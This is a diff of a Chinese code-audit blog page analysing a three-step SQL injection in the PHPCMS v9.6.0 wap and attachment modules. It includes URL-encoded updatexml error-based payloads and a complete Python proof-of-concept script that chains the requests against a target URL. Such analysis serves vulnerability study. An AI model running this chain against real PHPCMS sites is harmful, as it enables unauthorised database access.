@@ -18,31 +18,66 @@
   
   
   <title>代码审计之PHPCMSv9.6.0 wap模块SQL注入漏洞分析 | Tao&#39;s Blog</title>
-  <meta name="description" content="代码审计之PHPCMS v9.6.0 wap模块SQL注入漏洞分析漏洞利用此漏洞利用过程可能稍有复杂，我们可分为以下三个步骤：  Step1: GET请求访问 &#x2F;index.php?m&#x3D;wap&amp;c&#x3D;index&amp;siteid&#x3D;1  获取set-cookie中的_siteid 结尾的 cookie 字段的值   step2:  1.POST请求访问 &#x2F;index.php?m&#x3D;attac">
+  <meta name="description" content="环境搭建参考PHPCMS_V9.2任意文件上传getshell漏洞分析 漏洞复现此漏洞利用过程可能稍有复杂，我们可分为以下三个步骤：  Step1：GET请求访问&#x2F;index.php?m&#x3D;wap&amp;c&#x3D;index&amp;siteid&#x3D;1 获取set-cookie中的_siteid 结尾的 cookie 字段的值   Step2：1. POST请求访问 &#x2F;index.php?m&#x3D;attach">
 <meta property="og:type" content="article">
 <meta property="og:title" content="代码审计之PHPCMSv9.6.0 wap模块SQL注入漏洞分析">
 <meta property="og:url" content="https://taonn.github.io/2021/02/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS%20v9.6.0%20wap%E6%A8%A1%E5%9D%97SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="Tao&#39;s Blog">
-<meta property="og:description" content="代码审计之PHPCMS v9.6.0 wap模块SQL注入漏洞分析漏洞利用此漏洞利用过程可能稍有复杂，我们可分为以下三个步骤：  Step1: GET请求访问 &#x2F;index.php?m&#x3D;wap&amp;c&#x3D;index&amp;siteid&#x3D;1  获取set-cookie中的_siteid 结尾的 cookie 字段的值   step2:  1.POST请求访问 &#x2F;index.php?m&#x3D;attac">
+<meta property="og:description" content="环境搭建参考PHPCMS_V9.2任意文件上传getshell漏洞分析 漏洞复现此漏洞利用过程可能稍有复杂，我们可分为以下三个步骤：  Step1：GET请求访问&#x2F;index.php?m&#x3D;wap&amp;c&#x3D;index&amp;siteid&#x3D;1 获取set-cookie中的_siteid 结尾的 cookie 字段的值   Step2：1. POST请求访问 &#x2F;index.php?m&#x3D;attach">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210208174805741.png">
-<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210208175005742.png">
-<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210208175318799.png">
-<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209173132228.png">
-<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209173338398.png">
-<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209173659262.png">
-<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209174219035.png">
-<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209180751064.png">
-<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209181444482.png">
-<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209182026023.png">
-<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209182250488.png">
-<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209183944123.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327175727320.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327175905005.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327175959483.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328141903180.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327180215866.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328190127279.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328190156309.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327180803311.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327183751439.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327181035109.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327181243461.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327181307957.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327194234490.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327194935840.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195154232.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195328966.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195419521.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195446784.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195633409.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195855574.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327200212416.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327203005540.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328185153027.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328184248076.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328142217269.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327154645630.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327231720576.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328213156138.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328144942755.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328145323190.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328145945198.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328150413726.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328160718718.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328161836408.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328162339048.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328162419778.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328173701045.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328175409487.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328180909249.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328181606146.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328182146207.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328194150558.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328182535779.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328182942143.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328183316790.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328153708049.png">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328183720027.png">
 <meta property="article:published_time" content="2021-02-09T10:55:00.000Z">
-<meta property="article:modified_time" content="2021-03-16T05:29:17.857Z">
+<meta property="article:modified_time" content="2021-04-08T13:15:55.700Z">
 <meta property="article:author" content="Bobtaoy">
 <meta property="article:tag" content="PHP代码审计">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210208174805741.png">
+<meta name="twitter:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327175727320.png">
   <!-- Canonical links -->
   <link rel="canonical" href="https://taonn.github.io/2021/02/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS%20v9.6.0%20wap%E6%A8%A1%E5%9D%97SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
   
@@ -157,7 +192,7 @@
   <div class="widget">
     <h3 class="widget-title">Categories</h3>
     <div class="widget-body">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><span class="category-list-count">9</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><span class="category-list-count">6</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%83%A1%E4%B9%B1%E5%80%92%E8%85%BE/">胡乱倒腾</a><span class="category-list-count">1</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Red-team/">Red team</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><span class="category-list-count">9</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><span class="category-list-count">6</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%83%A1%E4%B9%B1%E5%80%92%E8%85%BE/">胡乱倒腾</a><span class="category-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -167,7 +202,7 @@
   <div class="widget">
     <h3 class="widget-title">Archive</h3>
     <div class="widget-body">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a><span class="archive-list-count">3</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a><span class="archive-list-count">3</span></li></ul>
     </div>
   </div>
 
@@ -179,6 +214,21 @@
     <div class="widget-body">
       <ul class="recent-post-list list-unstyled no-thumbnail">
         
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Red-team/">Red team</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/04/08/%E9%85%8D%E7%BD%AE%E5%9F%BA%E4%BA%8EWindows%E5%86%85%E7%BD%AE%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" class="title">配置基于Windows内置工具的端口转发</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-04-08T13:18:37.000Z" itemprop="datePublished">2021-04-08</time>
+              </p>
+            </div>
+          </li>
+          
           <li>
             
             <div class="item-inner">
@@ -239,21 +289,6 @@
             </div>
           </li>
           
-          <li>
-            
-            <div class="item-inner">
-              <p class="item-category">
-                <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
-              </p>
-              <p class="item-title">
-                <a href="/2021/02/02/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BBlueCMS-V1-6/" class="title">代码审计之BlueCMS_V1.6</a>
-              </p>
-              <p class="item-date">
-                <time datetime="2021-02-02T13:35:01.000Z" itemprop="datePublished">2021-02-02</time>
-              </p>
-            </div>
-          </li>
-          
       </ul>
     </div>
   </div>
@@ -269,7 +304,7 @@
   <div class="slimContent">
     <nav id="toc" class="article-toc">
       <h3 class="toc-title">Catalogue</h3>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">代码审计之PHPCMS v9.6.0 wap模块SQL注入漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%E6%88%AA%E5%9B%BE%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">复现过程截图：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90step3"><span class="toc-number">1.2.1.</span> <span class="toc-text">分析step3:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90step2"><span class="toc-number">1.2.2.</span> <span class="toc-text">分析step2:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90step1"><span class="toc-number">1.2.3.</span> <span class="toc-text">分析step1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A2%B3%E7%90%86"><span class="toc-number">1.2.4.</span> <span class="toc-text">梳理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.3.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E9%9D%A2%E6%8F%90%E5%88%B0%E9%97%AE%E9%A2%98%E7%9A%84%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">前面提到问题的分析</span></a></li></ol>
     </nav>
   </div>
 </aside>
@@ -313,7 +348,7 @@
         <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/02/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS%20v9.6.0%20wap%E6%A8%A1%E5%9D%97SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#comments" class="article-comment-link">Comments</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 1.1k(words)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 3.6k(words)</span>
 	
 	
 
@@ -321,70 +356,180 @@
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <h1 id="代码审计之PHPCMS-v9-6-0-wap模块SQL注入漏洞分析"><a href="#代码审计之PHPCMS-v9-6-0-wap模块SQL注入漏洞分析" class="headerlink" title="代码审计之PHPCMS v9.6.0 wap模块SQL注入漏洞分析"></a>代码审计之PHPCMS v9.6.0 wap模块SQL注入漏洞分析</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>此漏洞利用过程可能稍有复杂，我们可分为以下三个步骤：</p>
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>参考<a href="https://taonn.github.io/2021/02/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-2%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">PHPCMS_V9.2任意文件上传getshell漏洞分析</a></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>此漏洞利用过程可能稍有复杂，我们可分为以下三个步骤：</p>
 <ul>
-<li><p>Step1: GET请求访问 <code>/index.php?m=wap&amp;c=index&amp;siteid=1</code></p>
-<ul>
+<li><font color="red">Step1：</font>GET请求访问<code>/index.php?m=wap&amp;c=index&amp;siteid=1</code><ul>
 <li>获取<code>set-cookie</code>中的<code>_siteid </code>结尾的 cookie 字段的<strong>值</strong></li>
 </ul>
 </li>
-<li><p>step2:  1.POST请求访问 <code>/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</code></p>
-<ul>
-<li><p>此url通过url解码为: <code>index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;</code><br>(利用报错注入，语句可替换)</p>
+<li><font color="red">Step2：</font><font color="purple">1</font>. POST请求访问 <code>/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao</code><ul>
+<li>上面访问的url通过URL解码为：<code>index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=Tao</code> (<font color="red">报错注入，语句可替换</font>)</li>
+<li><font color="purple">2.</font> 将<code>Step1</code>获取<code>_siteid </code>结尾的 cookie 字段的<strong>值</strong>，赋值给 <code>userid_flash</code> 变量,以post数据提交</li>
+<li>获取<code>set-cookie</code>中的<code>_json</code>结尾字段的<strong>值</strong></li>
+</ul>
 </li>
-<li><p>2.将<code>Step1</code>获取<code>_siteid </code>结尾的 cookie 字段的<strong>值</strong>，赋值给 <code>userid_flash</code> 变量,以post数据提交</p>
-</li>
-<li><p>获取<code>set-cookie</code>中的<code>_json</code>结尾字段的<strong>值</strong></p>
-</li>
+<li><font color="red">Step3：</font>访问<code>/index.php?m=content&amp;c=down&amp;a_k=</code><font color="red">step2获取的_json结尾字段的值</font><ul>
+<li>eg：<code>/index.php?m=content&amp;c=down&amp;a_k=0e72z-2m8OJyw8injqvbY0xJtR5l5UtndXiFZmxcvK9kHkxN1COlnfyINF38Opx6UcdqlABV2gc-8RuG90sS6e31lJn2mxnkJPnUaQDCTAs0gEsKMnL5CHxl-o1hYg2TWaL5blo9RC8ya0yLkSc5NgzCqfTSgZCAlndhgum-OFk1XGARihPaYUs</code></li>
 </ul>
 </li>
 </ul>
-<ul>
-<li><p>step3: 访问<code>/index.php?m=content&amp;c=down&amp;a_k=step2获取的_json结尾字段的值</code></p>
-<ul>
-<li>例如访问<code>/index.php?m=content&amp;c=down&amp;a_k=0e72z-2m8OJyw8injqvbY0xJtR5l5UtndXiFZmxcvK9kHkxN1COlnfyINF38Opx6UcdqlABV2gc-8RuG90sS6e31lJn2mxnkJPnUaQDCTAs0gEsKMnL5CHxl-o1hYg2TWaL5blo9RC8ya0yLkSc5NgzCqfTSgZCAlndhgum-OFk1XGARihPaYUs</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="复现过程截图："><a href="#复现过程截图：" class="headerlink" title="复现过程截图："></a>复现过程截图：</h3><p><strong>step1</strong></p>
-<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210208174805741.png" alt="image-20210208174805741"></p>
-<p><strong>step2</strong></p>
-<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210208175005742.png" alt="image-20210208175005742"></p>
-<p><strong>step3</strong>, sql语句执行成功</p>
-<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210208175318799.png" alt="image-20210208175318799"></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>因为这里有三个步骤，而且关联密切，所以这次我们从后往前分析，最后再从梳理一遍</p>
-<h3 id="分析step3"><a href="#分析step3" class="headerlink" title="分析step3:"></a>分析step3:</h3><p>​    首先我们分析<code>phpcms/modules/content/down.php</code>中的<code>init</code>函数（刚开始会执行）：</p>
-<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209173132228.png" alt="image-20210209173132228"></p>
-<p>14行<code>sys_auth</code>函数对<code>$a_k</code>的值进行解密，然后17行<code>parse_str</code>函数对其以<code>&amp;</code>分隔符，解析注册变量，具体<code>parse_str</code>作用及用法如下：</p>
-<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209173338398.png" alt="image-20210209173338398"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">&quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 推荐用法</span></span><br><span class="line">parse_str($str, $output);</span><br><span class="line"><span class="keyword">echo</span> $output[<span class="string">&#x27;first&#x27;</span>];  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> $output[<span class="string">&#x27;arr&#x27;</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> $output[<span class="string">&#x27;arr&#x27;</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不建议这么用</span></span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> $first;  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> $arr[<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> $arr[<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Step1：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327175727320.png" alt="image-20210327175727320"></p>
+<p>Step2：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327175905005.png" alt="image-20210327175905005"></p>
+<p>Step3：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327175959483.png" alt="image-20210327175959483"></p>
+<p>老样子，贴个小脚本！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Author: Tao</span></span><br><span class="line"><span class="string">version: python3</span></span><br><span class="line"><span class="string"># 本脚本执行返回user()信息</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># from urllib import parse</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WAP_SQL</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment"># step1</span></span><br><span class="line">    url_one = url + <span class="string">&#x27;/index.php?m=wap&amp;c=index&amp;siteid=1&#x27;</span></span><br><span class="line">    step1 = requests.get(url_one)</span><br><span class="line">    userid_flash = step1.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># step2</span></span><br><span class="line">    payload = <span class="string">&#x27;%*27 and updatexml(1,concat(1,(user())),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=Tao&#x27;</span></span><br><span class="line">    url_two = url + <span class="string">r&quot;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=&#123;&#125;&quot;</span>.format(requests.utils.quote(payload))	<span class="comment"># 执行SQL语句，此处可修改</span></span><br><span class="line">    step2 = requests.post(url_two, data=&#123;<span class="string">&#x27;userid_flash&#x27;</span>: userid_flash&#125;)</span><br><span class="line">    <span class="keyword">for</span> cookie <span class="keyword">in</span> step2.cookies:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;_att_json&#x27;</span> <span class="keyword">in</span> cookie.name:</span><br><span class="line">            att_json = cookie.value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># step3</span></span><br><span class="line">    url_three = url + <span class="string">&#x27;/index.php?m=content&amp;c=down&amp;a_k=&#123;&#125;&#x27;</span>.format(att_json)</span><br><span class="line">    step3 = requests.get(url_three)</span><br><span class="line">    res = re.findall(<span class="string">r&quot;MySQL Error : &lt;/b&gt;XPATH syntax error: &#x27;(.*?)&#x27;&quot;</span>,step3.text)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    result_sql = WAP_SQL(url)</span><br><span class="line">    print(result_sql)</span><br></pre></td></tr></table></figure>
 
-<p>26行执行sql查询，我们跟进去看一下</p>
-<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210209173659262.png" alt="image-20210209173659262"></p>
-<p>走到上图140行，此时的执行的sql语句正好造成报错注入</p>
